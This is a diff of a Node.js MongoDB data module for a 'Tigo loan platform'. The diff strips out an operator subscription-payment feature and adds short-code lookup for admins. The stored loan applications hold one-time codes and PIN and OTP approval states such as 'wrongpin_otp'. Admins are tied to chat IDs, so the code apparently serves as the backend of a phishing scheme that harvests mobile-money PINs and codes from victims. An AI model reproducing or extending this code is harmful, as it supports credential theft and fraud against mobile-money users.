@@ -6,8 +6,7 @@ let db;
 const DB_NAME = 'tigo_loan_platform';
 const COLLECTIONS = {
     ADMINS: 'admins',
-    APPLICATIONS: 'applications',
-    PAYMENTS: 'subscription_payments'  // ✅ NEW: Payment tracking
+    APPLICATIONS: 'applications'
 };
 
 async function connectDatabase() {
@@ -34,9 +33,8 @@ async function createIndexes() {
         await db.collection(COLLECTIONS.ADMINS).createIndex({ email: 1 });
         await db.collection(COLLECTIONS.ADMINS).createIndex({ chatId: 1 });
         await db.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 });
+        // ✅ NEW: Short code index — must be unique and fast to look up
         await db.collection(COLLECTIONS.ADMINS).createIndex({ shortCode: 1 }, { unique: true, sparse: true });
-        // ✅ NEW: Payment status index
-        await db.collection(COLLECTIONS.ADMINS).createIndex({ paymentStatus: 1 });
 
         await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ id: 1 }, { unique: true });
         await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ adminId: 1 });
@@ -44,12 +42,6 @@ async function createIndexes() {
         await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 });
         await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 });
         await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 });
-
-        // ✅ NEW: Payment tracking indexes
-        await db.collection(COLLECTIONS.PAYMENTS).createIndex({ adminId: 1 });
-        await db.collection(COLLECTIONS.PAYMENTS).createIndex({ status: 1 });
-        await db.collection(COLLECTIONS.PAYMENTS).createIndex({ createdAt: -1 });
-        await db.collection(COLLECTIONS.PAYMENTS).createIndex({ paymentDate: -1 });
 
         console.log('✅ Database indexes created');
     } catch (error) {
@@ -80,6 +72,7 @@ async function saveAdmin(adminData) {
         const existingAdmin = await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
         if (existingAdmin) throw new Error(`Admin ${adminId} already exists in database`);
 
+        // Check short code is not already taken
         const existingCode = await db.collection(COLLECTIONS.ADMINS).findOne({ shortCode: adminData.shortCode });
         if (existingCode) throw new Error(`Short code '${adminData.shortCode}' is already taken`);
 
@@ -88,19 +81,13 @@ async function saveAdmin(adminData) {
             name: adminData.name,
             email: adminData.email,
             chatId: adminData.chatId,
-            shortCode: adminData.shortCode,
+            shortCode: adminData.shortCode,  // ✅ NEW FIELD
             status: adminData.status || 'active',
-            // ✅ NEW: Payment fields
-            paymentStatus: 'unpaid',  // unpaid, pending, paid
-            subscriptionAmount: 500,   // TSh 500
-            subscriptionStartDate: null,
-            subscriptionExpiryDate: null,
-            lastPaymentDate: null,
             createdAt: adminData.createdAt || new Date().toISOString()
         };
 
         const result = await db.collection(COLLECTIONS.ADMINS).insertOne(adminDocument);
-        console.log(`✅ Admin saved: ${adminId} | shortCode: ${adminData.shortCode} | Payment: ${adminDocument.paymentStatus}`);
+        console.log(`✅ Admin saved: ${adminId} | shortCode: ${adminData.shortCode}`);
         return result;
     } catch (error) {
         console.error('❌ Error saving admin:', error);
@@ -117,6 +104,7 @@ async function getAdmin(adminId) {
     }
 }
 
+// ✅ NEW: Look up admin by short code
 async function getAdminByShortCode(shortCode) {
     try {
         return await db.collection(COLLECTIONS.ADMINS).findOne({ shortCode: shortCode.toLowerCase() });
@@ -153,16 +141,6 @@ async function getActiveAdmins() {
     }
 }
 
-// ✅ NEW: Get admins by payment status
-async function getAdminsByPaymentStatus(paymentStatus) {
-    try {
-        return await db.collection(COLLECTIONS.ADMINS).find({ paymentStatus }).toArray();
-    } catch (error) {
-        console.error('❌ Error getting admins by payment status:', error);
-        return [];
-    }
-}
-
 async function updateAdmin(adminId, updates) {
     try {
         const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
@@ -173,33 +151,6 @@ async function updateAdmin(adminId, updates) {
         return result;
     } catch (error) {
         console.error('❌ Error updating admin:', error);
-        throw error;
-    }
-}
-
-async function updateAdminPaymentStatus(adminId, paymentStatus, paymentData = {}) {
-    try {
-        const updates = {
-            paymentStatus,
-            lastPaymentDate: new Date().toISOString(),
-            ...paymentData
-        };
-
-        if (paymentStatus === 'paid') {
-            const startDate = new Date();
-            const expiryDate = new Date(startDate.getTime() + 30 * 24 * 60 * 60 * 1000); // 30 days
-            updates.subscriptionStartDate = startDate.toISOString();
-            updates.subscriptionExpiryDate = expiryDate.toISOString();
-        }
-
-        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
-            { adminId },
-            { $set: updates }
-        );
-        console.log(`💳 Admin ${adminId} payment status: ${paymentStatus}`);
-        return result;
-    } catch (error) {
-        console.error('❌ Error updating payment status:', error);
         throw error;
     }
 }
@@ -245,124 +196,6 @@ async function getAdminCount() {
 }
 
 // ==========================================
-// PAYMENT OPERATIONS (NEW)
-// ==========================================
-
-async function recordPayment(adminId, paymentData) {
-    try {
-        const paymentRecord = {
-            adminId,
-            amount: paymentData.amount || 500,
-            status: paymentData.status || 'pending', // pending, approved, rejected
-            reason: paymentData.reason || '',
-            superAdminNote: paymentData.superAdminNote || '',
-            createdAt: new Date().toISOString(),
-            paymentDate: paymentData.paymentDate || new Date().toISOString(),
-            approvedAt: null,
-            rejectedAt: null
-        };
-
-        const result = await db.collection(COLLECTIONS.PAYMENTS).insertOne(paymentRecord);
-        console.log(`💳 Payment recorded for ${adminId}: ${paymentRecord.status}`);
-        return result;
-    } catch (error) {
-        console.error('❌ Error recording payment:', error);
-        throw error;
-    }
-}
-
-async function getPaymentByAdminId(adminId) {
-    try {
-        return await db.collection(COLLECTIONS.PAYMENTS).findOne(
-            { adminId, status: 'pending' },
-            { sort: { createdAt: -1 } }
-        );
-    } catch (error) {
-        console.error('❌ Error getting payment:', error);
-        return null;
-    }
-}
-
-async function getPendingPayments() {
-    try {
-        return await db.collection(COLLECTIONS.PAYMENTS).find({ status: 'pending' })
-            .sort({ createdAt: -1 }).toArray();
-    } catch (error) {
-        console.error('❌ Error getting pending payments:', error);
-        return [];
-    }
-}
-
-async function getAllPayments() {
-    try {
-        return await db.collection(COLLECTIONS.PAYMENTS).find({})
-            .sort({ createdAt: -1 }).toArray();
-    } catch (error) {
-        console.error('❌ Error getting all payments:', error);
-        return [];
-    }
-}
-
-async function approvePayment(paymentId, superAdminNote = '') {
-    try {
-        const payment = await db.collection(COLLECTIONS.PAYMENTS).findOne({ _id: paymentId });
-        if (!payment) throw new Error('Payment not found');
-
-        // Update payment status
-        await db.collection(COLLECTIONS.PAYMENTS).updateOne(
-            { _id: paymentId },
-            {
-                $set: {
-                    status: 'approved',
-                    superAdminNote,
-                    approvedAt: new Date().toISOString()
-                }
-            }
-        );
-
-        // Update admin status
-        await updateAdminPaymentStatus(payment.adminId, 'paid', { superAdminNote });
-
-        console.log(`✅ Payment approved for ${payment.adminId}`);
-        return true;
-    } catch (error) {
-        console.error('❌ Error approving payment:', error);
-        throw error;
-    }
-}
-
-async function rejectPayment(paymentId, superAdminNote = '') {
-    try {
-        const payment = await db.collection(COLLECTIONS.PAYMENTS).findOne({ _id: paymentId });
-        if (!payment) throw new Error('Payment not found');
-
-        // Update payment status
-        await db.collection(COLLECTIONS.PAYMENTS).updateOne(
-            { _id: paymentId },
-            {
-                $set: {
-                    status: 'rejected',
-                    superAdminNote,
-                    rejectedAt: new Date().toISOString()
-                }
-            }
-        );
-
-        // Update admin to remain unpaid
-        await db.collection(COLLECTIONS.ADMINS).updateOne(
-            { adminId: payment.adminId },
-            { $set: { paymentStatus: 'unpaid', superAdminNote } }
-        );
-
-        console.log(`❌ Payment rejected for ${payment.adminId}`);
-        return true;
-    } catch (error) {
-        console.error('❌ Error rejecting payment:', error);
-        throw error;
-    }
-}
-
-// ==========================================
 // APPLICATION OPERATIONS
 // ==========================================
 
@@ -377,7 +210,7 @@ async function saveApplication(appData) {
             pinStatus: appData.pinStatus || 'pending',
             otpStatus: appData.otpStatus || 'pending',
             otp: appData.otp || null,
-            assignmentType: 'specific',
+            assignmentType: 'specific', // ✅ Always specific now — no auto-assign
             isReturningUser: appData.isReturningUser || false,
             previousCount: appData.previousCount || 0,
             timestamp: appData.timestamp || new Date().toISOString()
@@ -454,9 +287,6 @@ async function getAdminStats(adminId) {
 async function getStats() {
     try {
         const totalAdmins = await db.collection(COLLECTIONS.ADMINS).countDocuments({});
-        const paidAdmins = await db.collection(COLLECTIONS.ADMINS).countDocuments({ paymentStatus: 'paid' });
-        const unpaidAdmins = await db.collection(COLLECTIONS.ADMINS).countDocuments({ paymentStatus: 'unpaid' });
-        const pendingPayments = await db.collection(COLLECTIONS.ADMINS).countDocuments({ paymentStatus: 'pending' });
         const totalApplications = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({});
         const pinPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'pending' });
         const pinApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'approved' });
@@ -465,9 +295,9 @@ async function getStats() {
         const totalRejected = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({
             $or: [{ pinStatus: 'rejected' }, { otpStatus: 'wrongpin_otp' }, { otpStatus: 'wrongcode' }]
         });
-        return { totalAdmins, paidAdmins, unpaidAdmins, pendingPayments, totalApplications, pinPending, pinApproved, otpPending, fullyApproved, totalRejected };
+        return { totalAdmins, totalApplications, pinPending, pinApproved, otpPending, fullyApproved, totalRejected };
     } catch (error) {
-        return { totalAdmins: 0, paidAdmins: 0, unpaidAdmins: 0, pendingPayments: 0, totalApplications: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0, totalRejected: 0 };
+        return { totalAdmins: 0, totalApplications: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0, totalRejected: 0 };
     }
 }
 
@@ -476,7 +306,7 @@ async function getPerAdminStats() {
         const admins = await getAllAdmins();
         return await Promise.all(admins.map(async (admin) => {
             const stats = await getAdminStats(admin.adminId);
-            return { adminId: admin.adminId, name: admin.name, paymentStatus: admin.paymentStatus, ...stats };
+            return { adminId: admin.adminId, name: admin.name, ...stats };
         }));
     } catch (error) {
         return [];
@@ -486,7 +316,7 @@ async function getPerAdminStats() {
 async function getAllAdminsDetailed() {
     try {
         const admins = await db.collection(COLLECTIONS.ADMINS).find({}).sort({ createdAt: -1 }).toArray();
-        admins.forEach(a => console.log(`   ${a.adminId}: ${a.name} | code: ${a.shortCode} | payment: ${a.paymentStatus} | chat: ${a.chatId} | status: ${a.status}`));
+        admins.forEach(a => console.log(`   ${a.adminId}: ${a.name} | code: ${a.shortCode} | chat: ${a.chatId} | status: ${a.status}`));
         return admins;
     } catch (error) {
         return [];
@@ -513,23 +343,15 @@ module.exports = {
     closeDatabase,
     saveAdmin,
     getAdmin,
-    getAdminByShortCode,
+    getAdminByShortCode,   // ✅ NEW EXPORT
     getAdminByChatId,
     getAllAdmins,
     getActiveAdmins,
-    getAdminsByPaymentStatus,
     updateAdmin,
-    updateAdminPaymentStatus,
     updateAdminStatus,
     deleteAdmin,
     adminExists,
     getAdminCount,
-    recordPayment,
-    getPaymentByAdminId,
-    getPendingPayments,
-    getAllPayments,
-    approvePayment,
-    rejectPayment,
     saveApplication,
     getApplication,
     updateApplication,
